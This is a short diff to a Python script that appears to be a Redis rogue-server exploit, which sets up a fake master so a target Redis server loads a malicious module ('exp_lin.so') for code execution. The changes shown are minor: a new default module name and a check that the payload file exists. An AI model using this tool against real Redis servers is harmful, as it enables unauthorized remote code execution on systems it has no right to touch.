@@ -18,7 +18,6 @@ LOGO = R"""
 
 """
 
-
 def mk_cmd_arr(arr):
     cmd = ""
     cmd += "*" + str(len(arr))
@@ -200,7 +199,7 @@ def main():
                         help="rogue server ip", required=True)
     parser.add_argument("-P", "--lport", dest="lport", type=int,
                         help="rogue server listen port, default 21000", default=21000)
-    parser.add_argument("-f", "--file", type=str, help="RedisModules to load, default exp.so", default='exp.so')
+    parser.add_argument("-f", "--file", type=str, help="RedisModules to load, default exp.so", default='exp_lin.so')
     parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password")
     parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
     options = parser.parse_args()
@@ -211,6 +210,9 @@ def main():
     auth = options.auth
     filename = options.file
     verbose = options.verbose
+    if os.path.exists(filename) == False:
+        print("\033[1;31;m[-]\033[0m Where you module? ")
+        exit(0)
     payload = open(filename, "rb").read()
     try:
         runserver(options.rhost, options.rport, options.lhost, options.lport)
